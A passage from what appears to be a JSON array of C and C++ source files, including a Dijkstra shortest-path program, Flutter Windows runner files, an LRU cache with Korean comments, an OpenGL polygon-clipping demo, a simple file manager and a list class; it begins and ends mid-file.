num1/num2 <<endl;\r\n\r\n        }\r\n        break;\r\n           default:\r\n            cout <<\"invalid choie ! please chooce again.\"<< endl;\r\n        }\r\n\r\n}\r\n",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\nconst int N = 1e3+10; \r\nconst int INF = 1e9+10; \r\n  \r\nvector<pair<int,int>> graph[N]; \r\n\r\nset<pair<int,int>> st;\r\nvector<int> visited(N,0);\r\nvector<int> dist(N,INF);\r\nmap<int,pair<int,int>> nodeStore;\r\nstack<int> path;\r\n\r\nbool visDFS[N]; \r\nstack<int> stackDFS;\r\n\r\nvoid dfs(int vertex){ \r\n\r\n  if(visDFS[vertex]) \r\n    return; \r\n  //cout << \"vertex: \" << vertex << endl;   \r\n  visDFS[vertex] = true;  \r\n\r\n  for(auto child : graph[vertex]){ \r\n    //cout << \"par: \" << vertex << \" child: \" << child.first << endl;\r\n    dfs(child.first); \r\n  }    \r\n  \r\n  stackDFS.push(vertex);\r\n} \r\n\r\n\r\nvoid relax(int v, int child_v,int wt){\r\n    if(dist[v] + wt < dist[child_v]){\r\n      dist[child_v] = dist[v] + wt;\r\n      st.insert({dist[child_v] , child_v});\r\n      //nodeStore.insert({child_v, dist[child_v]});\r\n      nodeStore[child_v] = {v,wt};\r\n    }\r\n}\r\n\r\nvoid dijkstra (int source, int nodeNum){\r\n  \r\n  for(int i=1 ; i<=nodeNum ; i++){\r\n    nodeStore[i] = {404,404};\r\n  }\r\n\r\n  st.insert({0,source});\r\n  nodeStore[source] = {-1,0};\r\n  dist[source] = 0;\r\n  \r\n  while(st.size() > 0){\r\n    auto node = *st.begin();\r\n    int v = node.second;\r\n    int v_dist = node.first;\r\n    \r\n    // auto it = st.begin();\r\n    // int element = (*it).second;\r\n    //cout << element << endl;\r\n    \r\n    st.erase(st.begin());\r\n    \r\n    if(visited[v])\r\n      continue;\r\n      \r\n    visited[v] = 1;\r\n    \r\n    for(auto child: graph[v]){\r\n      int child_v = child.first;\r\n      int wt = child.second;\r\n\r\n      relax(v,child_v,wt);\r\n    }\r\n  }\r\n}\r\n  \r\n  \r\nint main() { \r\n    int node,edge; \r\n    cin >> node >> edge; \r\n     \r\n    int v1,v2,wt; \r\n    for(int i=0 ; i<edge ; i++){ \r\n      cin >> v1 >> v2 >> wt; \r\n      \r\n      graph[v1].push_back({v2,wt});\r\n    } \r\n  \r\n    for(int i=1 ; i<=node ; i++){  \r\n      cout << i << \" : \";  \r\n      for(int j=0 ; j<graph[i].size() ; j++){  \r\n            cout << graph[i][j].first << \" \";  \r\n      }  \r\n      cout << endl;  \r\n    } \r\n    \r\n    int source,dest,weightSum=0;\r\n    \r\n    cin >> source >> dest;\r\n    \r\n    dijkstra(source,node);\r\n    \r\n    for(int i=1 ; i<=node ; i++){\r\n      if(!visDFS[i])\r\n        dfs(i);\r\n    }\r\n    \r\n    cout << \"topologically sorted order: \";\r\n    while(!stackDFS.empty()){\r\n      cout << stackDFS.top() << \" \";\r\n      stackDFS.pop();\r\n    }\r\n    cout << endl << endl;\r\n    \r\n    // for(auto it: nodeStore){\r\n    //   cout << it.first << \" e jaite \" << it.second.first << \" theke weight \" << it.second.second << endl;\r\n    // }\r\n    \r\n    if(nodeStore[dest].first == 404){\r\n      cout << endl << \"not possible to go from \" << source << \" to \" << dest << endl;\r\n    }\r\n    else{\r\n      while(nodeStore[dest].first != -1){\r\n          weightSum += nodeStore[dest].second;\r\n          //cout << nodeStore[dest].second << \" \";\r\n          path.push(dest);\r\n          dest = nodeStore[dest].first;\r\n      }\r\n      path.push(source);\r\n      \r\n      while(!path.empty()){\r\n        cout << \" \" << path.top() << \" ->\";\r\n        path.pop();\r\n      }\r\n      cout << \">| \" << endl;\r\n      \r\n      cout << \"total path weight: \" << weightSum << endl;\r\n    }\r\n} \r\n\r\n/*\r\n8 11\r\n4 5 1\r\n4 3 2\r\n4 8 5\r\n5 2 3\r\n5 1 1\r\n8 5 2\r\n8 3 2\r\n3 1 4\r\n3 6 3\r\n1 7 3\r\n7 6 4\r\n8 7\r\n*/\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"cache.h\"\n#include <sstream>\n\n// TODO: \ud544\uc694\ud55c \ud568\uc218 \uad6c\ud604\n\nCache::Cache() {}\nCache::~Cache() {}\n\n// int\ub97c cache\uc5d0 \ucd94\uac00\ud55c\ub2e4, palindrome \uc758 \uacbd\uc6b0\nvoid Cache::add(std::string key, int value)\n{\n    if (cache_list_.size_ == CACHE_SIZE) // \uaf49 \ucc28\uc11c \ub9c8\uc9c0\ub9c9 \uce90\uc2dc \ub178\ub4dc\ub97c \uc9c0\uc6b0\uace0 \uadf8\uac83\uc744 \uac00\ub9ac\ud0a4\ub294 \ud574\uc2dc \ub178\ub4dc\ub97c \uc9c0\uc6b4\ub2e4\n    {\n        std::string last_cache_node_key = cache_list_.get_key(CACHE_SIZE - 1); // \ub9c8\uc9c0\ub9c9 \uce90\uc2dc \ub178\ub4dc\uc758 \ud0a4\n        int hashed_key = hash(last_cache_node_key);                            // \ud574\uc2dc \ub9ac\uc2a4\ud2b8 \uc778\ub371\uc2a4\n\n        cache_list_.del_node(CACHE_SIZE - 1); // \uce90\uc2dc \ub178\ub4dc \uc0ad\uc81c \uc644\ub8cc\n\n        for (int i = 0; i < hash_map_lists_[hashed_key].size_; i++)\n        {\n            if (hash_map_lists_[hashed_key].get_key(i).find(last_cache_node_key) !=\n                std::string::npos) // \ub9c8\uc9c0\ub9c9 \uce90\uc2dc \ub178\ub4dc\ub97c \uac00\ub9ac\ud0a4\ub294 \ud574\uc2dc \ub178\ub4dc\ub97c \ucc3e\uc558\ub2e4\uba74\n            {\n                hash_map_lists_[hashed_key].del_node(i); // \ud574\uc2dc \ub178\ub4dc \uc0ad\uc81c \uc644\ub8cc\n                break;\n            }\n            \n        }\n    }\n\n    cache_list_.add_node_at_0(key, value);\n    hash_map_lists_[hash(key)].add_node_at_0(\"hash_\" + key, cache_list_.head_->next_);\n}\n// double\uc744 cache\uc5d0 \ucd94\uac00\ud55c\ub2e4, multiply \uc758 \uacbd\uc6b0\nvoid Cache::add(std::string key, double value)\n{\n    if (cache_list_.size_ == CACHE_SIZE) // \uaf49 \ucc28\uc11c \ub9c8\uc9c0\ub9c9 \uce90\uc2dc \ub178\ub4dc\ub97c \uc9c0\uc6b0\uace0 \uadf8\uac83\uc744 \uac00\ub9ac\ud0a4\ub294 \ud574\uc2dc \ub178\ub4dc\ub97c \uc9c0\uc6b4\ub2e4\n    {\n        std::string last_cache_node_key = cache_list_.get_key(CACHE_SIZE - 1); // \ub9c8\uc9c0\ub9c9 \uce90\uc2dc \ub178\ub4dc\uc758 \ud0a4\n        int hashed_key = hash(last_cache_node_key);                            // \ud574\uc2dc \ub9ac\uc2a4\ud2b8 \uc778\ub371\uc2a4\n\n        cache_list_.del_node(CACHE_SIZE - 1); // \uce90\uc2dc \ub178\ub4dc \uc0ad\uc81c \uc644\ub8cc\n\n        for (int i = 0; i < hash_map_lists_[hashed_key].size_; i++)\n        {\n            if (hash_map_lists_[hashed_key].get_key(i).find(last_cache_node_key) !=\n                std::string::npos) // \ub9c8\uc9c0\ub9c9 \uce90\uc2dc \ub178\ub4dc\ub97c \uac00\ub9ac\ud0a4\ub294 \ud574\uc2dc \ub178\ub4dc\ub97c \ucc3e\uc558\ub2e4\uba74\n            {\n                hash_map_lists_[hashed_key].del_node(i); // \ud574\uc2dc \ub178\ub4dc \uc0ad\uc81c \uc644\ub8cc\n            }\n            break;\n        }\n    }\n\n    cache_list_.add_node_at_0(key, value);\n    hash_map_lists_[hash(key)].add_node_at_0(\"hash_\" + key, cache_list_.head_->next_);\n}\n\n// key\uc5d0 \ud574\ub2f9\ud558\ub294 value\ub97c cache\uc5d0\uc11c \uac00\uc838\uc628\ub2e4\n// \ud0c0\uc785\uacfc key\uac00 \ub3d9\uc77c\ud55c \uc6d0\uc18c\uac00 \uc5c6\ub2e4\uba74 false\ub97c \ubc18\ud658\ud55c\ub2e4.\nbool Cache::get(std::string key, int &value)\n{ // palindrome \uc758 \uacbd\uc6b0\n\n    bool is_hit = false;\n    int hashed_key = hash(key);\n\n    for (int i = 0; i < hash_map_lists_[hashed_key].size_; i++)\n    {\n        if (hash_map_lists_[hashed_key].get_key(i).find(key) != std::string::npos)\n        { // \uce90\uc2dc \ub178\ub4dc\ub97c \uac00\ub9ac\ud0a4\ub294 \ud574\uc2dc \ub178\ub4dc\ub97c \ucc3e\uc558\ub2e4\uba74\n            is_hit = true;\n            value = static_cast<const int>(*static_cast<const int *>(\n                static_cast<const Node *>(hash_map_lists_[hashed_key].get_value(i))->value_));\n            cache_list_.move_node_to_0(key);\n            break;\n        }\n    }\n\n    return is_hit;\n}\n// key\uc5d0 \ud574\ub2f9\ud558\ub294 value\ub97c cache\uc5d0\uc11c \uac00\uc838\uc628\ub2e4.\n// \ud0c0\uc785\uacfc key\uac00 \ub3d9\uc77c\ud55c \uc6d0\uc18c\uac00 \uc5c6\ub2e4\uba74 false\ub97c \ubc18\ud658\ud55c\ub2e4.\nbool Cache::get(std::string key, double &value)\n{ // multiply \uc758 \uacbd\uc6b0\n    bool is_hit = false;\n    int hashed_key = hash(key);\n\n    for (int i = 0; i < hash_map_lists_[hashed_key].size_; i++)\n    {\n        if (hash_map_lists_[hashed_key].get_key(i).find(key) != std::string::npos)\n        {\n            is_hit = true;\n            value = static_cast<const double>(*static_cast<const double *>(\n                static_cast<const Node *>(hash_map_lists_[hashed_key].get_value(i))->value_));\n            cache_list_.move_node_to_0(key);\n            break;\n        }\n    }\n\n    return is_hit;\n}\n\n// \ub514\ubc84\uadf8 \ubc0f \ucc44\uc810 \uc6a9: \uc5f0\uacb0 \ub9ac\uc2a4\ud2b8\ub97c \ubb38\uc790\uc5f4\ub85c \ud45c\ud604\ud558\uc5ec \ubc18\ud658\ud55c\ub2e4\n// \ub2e4\uc74c\uacfc \uac19\uc774 \ud45c\ud604\ub41c \ubb38\uc790\uc5f4\uc744 \ubc18\ud658\ud55c\ub2e4\n// [key1: value1] -> [key2: value2] -> ... -> [keyN: valueN]\nstd::string Cache::toString()\n{\n    std::ostringstream ss;\n    for (int i = 0; i < cache_list_.size_; i++)\n    {\n        ss << (\"[\" + cache_list_.get_key(i) + \": \");\n        if (cache_list_.get_key(i).find(\"palindrome\") != std::string::npos)\n        {\n            ss << *static_cast<const int *>(cache_list_.get_value(i));\n        }\n        else\n        {\n            ss << *static_cast<const double *>(cache_list_.get_value(i));\n        }\n        ss << \"]\";\n\n        if (i + 1 != cache_list_.size_)\n        {\n            ss << \" -> \";\n        }\n    }\n    ss << \"\\n\";\n    return ss.str();\n}",
    "#include<stdio.h>\n#include<GL/gl.h>\n#include<GL/glu.h>\n#include<GL/glut.h>\n#include<math.h>\n\ntypedef struct\n{\nfloat x;\nfloat y;\n}PT;\n\nint n;\n\nint i,j;\n\nPT p1,p2,p[20],pp[20];\n\nvoid left()\n{\ni=0;j=0;\n\nfor(i=0;i<n;i++)\n{\nif(p[i].x<p1.x && p[i+1].x>=p1.x)\n{\nif(p[i+1].x-p[i].x!=0)\n{\npp[j].y=(p[i+1].y-p[i].y)/(p[i+1].x-p[i].x)*(p1.x-p[i].x)+p[i].y;\n}\nelse\n{\npp[j].y=p[i].y;\n}\npp[j].x=p1.x;\nj++;\npp[j].x=p[i+1].x;\npp[j].y=p[i+1].y;\nj++;\n\n}\n\nif(p[i].x>=p1.x && p[i+1].x>=p1.x)\n{\npp[j].y=p[i+1].y;\npp[j].x=p[i+1].x;\nj++;\n}\n\nif(p[i].x>=p1.x && p[i+1].x<p1.x)\n{\nif(p[i+1].x-p[i].x!=0)\n{\npp[j].y=(p[i+1].y-p[i].y)/(p[i+1].x-p[i].x)*(p1.x-p[i].x)+p[i].y;\n}\nelse\n{\npp[j].y=p[i].y;\n}\npp[j].x=p1.x;\nj++;\n}\n}\n\nfor(i=0;i<j;i++)\n{\np[i].x=pp[i].x;\np[i].y=pp[i].y;\n}\n\np[i].x=pp[0].x;\np[i].y=pp[0].y;\nn=j;\n}\n\n\nvoid right()\n{\ni=0;j=0;\n\nfor(i=0;i<n;i++)\n{\nif(p[i].x>p2.x && p[i+1].x<=p2.x)\n{\nif(p[i+1].x-p[i].x!=0)\n{\npp[j].y=(p[i+1].y-p[i].y)/(p[i+1].x-p[i].x)*(p2.x-p[i].x)+p[i].y;\n}\nelse\n{\npp[j].y=p[i].y;\n}\npp[j].x=p2.x;\nj++;\npp[j].x=p[i+1].x;\npp[j].y=p[i+1].y;\nj++;\n}\n\nif(p[i].x<=p2.x && p[i+1].x<=p2.x)\n{\npp[j].y=p[i+1].y;\npp[j].x=p[i+1].x;\nj++;\n}\n\nif(p[i].x<=p2.x && p[i+1].x>p2.x)\n{\nif(p[i+1].x-p[i].x!=0)\n{\npp[j].y=(p[i+1].y-p[i].y)/(p[i+1].x-p[i].x)*(p2.x-p[i].x)+p[i].y;\n}\nelse\n{\npp[j].y=p[i].y;\n}\npp[j].x=p2.x;\nj++;\n}\n\n}\n\nfor(i=0;i<j;i++)\n{\np[i].x=pp[i].x;\np[i].y=pp[i].y;\n}\n\np[i].x=pp[0].x;\np[i].y=pp[0].y;\n\n}\n\nvoid top()\n{\ni=0;j=0;\n\nfor(i=0;i<n;i++)\n{\nif(p[i].y>p2.y && p[i+1].y<=p2.y)\n{\nif(p[i+1].y-p[i].y!=0)\n{\npp[j].x=(p[i+1].x-p[i].x)/(p[i+1].y-p[i].y)*(p2.y-p[i].y)+p[i].x;\n}\nelse\n{\npp[j].x=p[i].x;\n}\npp[j].y=p2.y;\nj++;\npp[j].x=p[i+1].x;\npp[j].y=p[i+1].y;\nj++;\n}\n\nif(p[i].y<=p2.y && p[i+1].y<=p2.y)\n{\npp[j].y=p[i+1].y;\npp[j].x=p[i+1].x;\nj++;\n}\n\nif(p[i].y<=p2.y && p[i+1].y>p2.y)\n{\nif(p[i+1].y-p[i].y!=0)\n{\npp[j].x=(p[i+1].x-p[i].x)/(p[i+1].y-p[i].y)*(p2.y-p[i].y)+p[i].x;\n}\nelse\n{\npp[j].x=p[i].x;\n}\npp[j].y=p2.y;\nj++;\n}\n}\n\nfor(i=0;i<j;i++)\n{\np[i].x=pp[i].x;\np[i].y=pp[i].y;\n}\n\np[i].x=pp[0].x;\np[i].y=pp[0].y;\nn=j;\n}\n\n\nvoid bottom()\n{\ni=0;j=0;\n\nfor(i=0;i<n;i++)\n{\nif(p[i].y<p1.y && p[i+1].y>=p1.y)\n{\nif(p[i+1].y-p[i].y!=0)\n{\npp[j].x=(p[i+1].x-p[i].x)/(p[i+1].y-p[i].y)*(p1.y-p[i].y)+p[i].x;\n}\nelse\n{\npp[j].x=p[i].x;\n}\npp[j].y=p1.y;\nj++;\npp[j].x=p[i+1].x;\npp[j].y=p[i+1].y;\nj++;\n}\n\nif(p[i].y>=p1.y && p[i+1].y>=p1.y)\n{\npp[j].x=p[i+1].x;\npp[j].y=p[i+1].y;\nj++;\n}\n\nif(p[i].y>=p1.y && p[i+1].y<p1.y)\n{\nif(p[i+1].y-p[i].y!=0)\n{\npp[j].x=(p[i+1].x-p[i].x)/(p[i+1].y-p[i].y)*(p1.y-p[i].y)+p[i].x;\n}\nelse\n{\npp[j].x=p[i].x;\n}\npp[j].y=p1.y;\nj++;\n}\n}\n\nfor(i=0;i<j;i++)\n{\np[i].x=pp[i].x;\np[i].y=pp[i].y;\n}\np[i].x=pp[0].x;\np[i].y=pp[0].y;\nn=j;\n}\n\nvoid drawpolygon()\n{\nglColor3f(0.0,1.0,1.0);\nfor(i=0;i<n-1;i++)\n{\nglBegin(GL_LINES);\nglVertex2d(p[i].x,p[i].y);\nglVertex2d(p[i+1].x,p[i+1].y);\nglEnd();\n}\nglBegin(GL_LINES);\nglVertex2d(p[i].x,p[i].y);\nglVertex2d(p[0].x,p[0].y);\nglEnd();\n}\n\nvoid myMouse(int button, int state, int x, int y)\n{\nif(button==GLUT_LEFT_BUTTON && state==GLUT_DOWN)\n{\nglClear(GL_COLOR_BUFFER_BIT);\n\nglBegin(GL_LINE_LOOP);\nglVertex2f(p1.x,p1.y);\nglVertex2f(p2.x,p1.y);\nglVertex2f(p2.x,p2.y);\nglVertex2f(p1.x,p2.y);\nglEnd();\nleft();\nright();\ntop();\nbottom();\ndrawpolygon();\n}\nglFlush();\n}\n\n\nvoid display(void)\n{\nglClear(GL_COLOR_BUFFER_BIT);\nglColor3f(0.4,0.0,1.0);\nglBegin(GL_LINE_LOOP);\nglVertex2f(p1.x, p1.y);\nglVertex2f(p2.x,p1.y);\nglVertex2f(p2.x,p2.y);\nglVertex2f(p1.x,p2.y);\nglEnd();\ndrawpolygon();\nglFlush();\n}\n\nvoid init(void)\n{\nglClearColor(0.0,0.0,0.0,0.0);\ngluOrtho2D(0,500,0,500);\n}\n\nint main(int argc, char**argv)\n{\nprintf(\"Enter Window Coordinates:\\n\");\nprintf(\"Please Enter two Points:\\n\");\nprintf(\"Enter P1(x,y):\\n\");\nscanf(\"%f\", &p1.x);\nscanf(\"%f\", &p1.y);\n\nprintf(\"Enter P2(x,y):\\n\");\nscanf(\"%f\", &p2.x);\nscanf(\"%f\", &p2.y);\n\nprintf(\"\\nEnter the no. of vertices:\");\nscanf(\"%d\", &n);\n\nfor(i=0;i<n;i++)\n{\nprintf(\"\\nEnter V%d(x%d,y%d):\\n\" , i+1, i+1, i+1);\nscanf(\"%f\", &p[i].x);\nscanf(\"%f\", &p[i].y);\n}\n\np[i].x=p[0].x;\np[i].y=p[0].y;\n\nglutInit(&argc,argv);\nglutInitDisplayMode(GLUT_SINGLE|GLUT_RGB);\nglutInitWindowSize(640,480);\nglutInitWindowPosition(0,0);\nglutCreateWindow(\"Sutherland Hodgman Polygon Clipping Algorithm \");\ninit();\n\nglutDisplayFunc(display);\nglutMouseFunc(myMouse);\nglFlush();\nglutMainLoop();\nreturn 0;\n\n\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_teste_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <windows.h>\r\n#include <fstream>\r\n#include <filesystem>\r\n\r\nusing namespace std;\r\n\r\nbool createDirectory(const std::string& folderName) \r\n{\r\n    if (CreateDirectoryA(folderName.c_str(), nullptr) || GetLastError() == ERROR_ALREADY_EXISTS) \r\n        return true;\r\n    \r\n    return false;\r\n}\r\n\r\nvoid createFileInDirectory(const std::string& directory, const std::string& fileName,std::string &content)\r\n{\r\n    std::string directoryPath = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\"+ directory;  //put the path of your file in the pc\r\n    std::string filePath = directoryPath + \"\\\\\" + fileName;\r\n    std::ofstream outputFile(filePath);\r\n\r\n    if (outputFile.is_open())\r\n    {\r\n        cout << \"File created successfully in directory: \" << directory << endl;\r\n        outputFile << content;\r\n        outputFile.close();\r\n    }\r\n    else \r\n    {\r\n        cout << \"Unable to create the file in directory: \" << directory << endl;\r\n    }   \r\n}\r\n\r\nvoid ReadFile(const std::string &directory,const std::string& inputFile)\r\n{\r\n    std::string directoryPath = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + directory;\r\n    std::string filePath = directoryPath + \"\\\\\" + inputFile;\r\n    std::ifstream inputFileStream(filePath);\r\n\r\n    if (inputFileStream.is_open())\r\n    {\r\n       cout << \"\\nContent of the file:\\n\";\r\n\r\n        std::string line;\r\n        while (std::getline(inputFileStream, line)) \r\n        {\r\n            cout << line << '\\n';\r\n        }\r\n        inputFileStream.close();\r\n    }\r\n    else \r\n    {\r\n        cout << \"Unable to open the file for reading.\\n\";\r\n    }\r\n}\r\n\r\nvoid CopyFile(const string& directory1, const string& directory2, const string& file1, const string& file2)\r\n{\r\n    fstream f1, f2;\r\n    string ch;\r\n\r\n    string filePath1 = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + directory1 + \"\\\\\" + file1;\r\n\r\n    f1.open(filePath1, ios::in);\r\n\r\n    if (!f1.is_open()) {\r\n        cout << \"Error opening source file: \" << filePath1 << endl;\r\n        return;\r\n    }\r\n\r\n    string filePath2 = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + directory2 + \"\\\\\" + file2;\r\n\r\n    f2.open(filePath2, ios::out);\r\n\r\n    if (!f2.is_open()) {\r\n        cout << \"Error opening destination file: \" << filePath2 << endl;\r\n        f1.close();\r\n        return;\r\n    }\r\n\r\n    while (getline(f1, ch))\r\n    {\r\n        f2 << ch << endl;\r\n    }\r\n\r\n    f1.close();\r\n    f2.close();\r\n\r\n    f2.open(filePath2, ios::in);\r\n\r\n    while (getline(f2, ch))\r\n    {\r\n        cout << ch << endl;\r\n    }\r\n\r\n    f2.close();\r\n}\r\n\r\nvoid MoveFile(const string& sourceDirectory, const string& destinationDirectory, const string& sourceFile, const string& destinationFile)\r\n{\r\n    fstream sourceFileStream, destinationFileStream;\r\n    string line;\r\n\r\n    string sourceFilePath = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + sourceDirectory + \"\\\\\" + sourceFile;\r\n\r\n    sourceFileStream.open(sourceFilePath, ios::in);\r\n\r\n    if (!sourceFileStream.is_open()) {\r\n        cout << \"Error opening source file: \" << sourceFilePath << endl;\r\n        return;\r\n    }\r\n\r\n    string destinationFilePath = \"C:\\\\Users\\\\Sara\\\\Desktop\\\\Code_Alpha\\\\File_Manager\\\\\" + destinationDirectory + \"\\\\\" + destinationFile;\r\n\r\n    destinationFileStream.open(destinationFilePath, ios::out);\r\n\r\n    if (!destinationFileStream.is_open()) {\r\n        cout << \"Error opening destination file: \" << destinationFilePath << endl;\r\n        sourceFileStream.close();\r\n        return;\r\n    }\r\n\r\n    while (getline(sourceFileStream, line))\r\n    {\r\n        destinationFileStream << line << endl;\r\n    }\r\n\r\n    sourceFileStream.close();\r\n    destinationFileStream.close();\r\n\r\n    if (remove(sourceFilePath.c_str()) != 0) {\r\n        cout << \"Error deleting source file: \" << sourceFilePath << endl;\r\n    }\r\n    else {\r\n        cout << \"File moved successfully.\" << endl;\r\n    }\r\n}\r\n\r\n\r\nint main()\r\n{\r\n    int choice;\r\n\r\n    do\r\n    {\r\n        cout << \"Which operation do you perform: \" << endl;\r\n        cout << \"1) Create Directory\" << endl;\r\n        cout << \"2) Create File in a Directory\" << endl;\r\n        cout << \"3) Read File\" << endl;\r\n        cout << \"4) Move File\" << endl;\r\n        cout << \"5) Copy File\" << endl;\r\n        cout << \"Enter 0 to Exit\" << endl;\r\n        cout << \"Enter your option\" << endl;\r\n        cin >> choice;\r\n        cin.ignore();\r\n\r\n        if(choice==1)\r\n        {\r\n            string directory_name;\r\n            cout << \"Enter the name of the directory\" << endl;\r\n            std::getline(std::cin, directory_name);\r\n            createDirectory(directory_name);\r\n           \r\n        }\r\n        else if(choice ==2)\r\n        {\r\n            string directory_name;\r\n            cout << \"Enter the name of the directory\" << endl;\r\n            std::getline(std::cin, directory_name);\r\n            string file_name;\r\n            cout << \"Enter the name of the file\" << endl;\r\n            cin >> file_name;\r\n            std::string content=\"i am c",
    "#include <cassert>\n#include <iostream>\n\n#include \"listType.h\"\n\nlistType::listType(int max)\n{\n  this->size = 0;\n  this->maxSize = max;\n  this->dataArr[100] = {0};\n}\n\n// look for an item. return index of first occurrence\n  int listType::search(int element) const {\n    for (int i = 0; i < this->size; i++) {\n      if (this->dataArr[i] == element)\n      {\n        return i;\n      }\n    }\n    return -1;\n  }\n\n  // return element at a specific location\n  int listType::at(int index) const {\n    assert(index >= 0 && index < this->size);\n    return this->dataArr[index];\n  }\n  /*\n  //Commented out for part 2;\n  // print content of list on screen in format of [a, b, c]\n  void listType::print() const {\n    std::cout << \"[\";\n    for (int i = 0; i < this->size; i++) {\n      std::cout << at(i);\n      if (i < this->size - 1) {\n        std::cout << \", \";\n      }\n    }\n    std::cout << \"]\" << std::endl;\n  } */\n\n  // append/insert an element at the end\n  bool listType::insert(int element) {\n    if (this->size < this->maxSize) {\n      this->dataArr[this->size] = element;\n      this->size++;\n      return true;\n    }\n    return false;\n  }\n\n  // insert an element into location index\n  // Shifts the element currently at that index (if any) and any subsequent elements to the right\n  bool listType::insert(int index, int element)\n  {\n    if (this->size == this->maxSize || index >= this->size || index < 0)\n    {\n      return false;\n    }\n    for (int i = this->size; i > index; i--) {\n      this->dataArr[i] = this->dataArr[i - 1];\n    }\n    this->dataArr[index] = element;\n    this->size++;\n    return true;\n  }\n\n  // remove element at the specified location\n  bool listType::remove(int index) {\n    if (this->size <= 0 || index >= this->size || index < 0)\n    {\n      return false;\n    }\n    for (int i = index; i < this->size; i++)\n    {\n      this->dataArr[i] = 